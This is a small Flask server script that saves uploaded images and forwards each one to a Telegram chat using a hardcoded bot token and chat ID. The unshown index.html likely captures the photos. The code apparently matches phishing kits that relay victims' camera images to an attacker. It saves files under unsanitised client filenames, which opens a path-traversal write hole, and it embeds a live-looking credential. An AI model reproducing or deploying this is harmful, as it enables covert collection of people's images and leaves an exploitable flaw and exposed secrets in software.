from flask import Flask, request
import requests
import os

app = Flask(__name__)
TOKEN = '8514844112:AAHzlLYUuM_aw8-3qnRKEMIy1M-SyhAy5jk'
CHAT_ID = '8797738653'

if not os.path.exists('storage'):
    os.makedirs('storage')

@app.route('/')
def index():
    return open('index.html').read()

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['image']
    filepath = os.path.join('storage', file.filename)
    file.save(filepath)
    url = f'https://api.telegram.org/bot{TOKEN}/sendPhoto'
    with open(filepath, 'rb') as f:
        files = {'photo': f}
        data = {'chat_id': CHAT_ID}
        requests.post(url, files=files, data=data)
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)


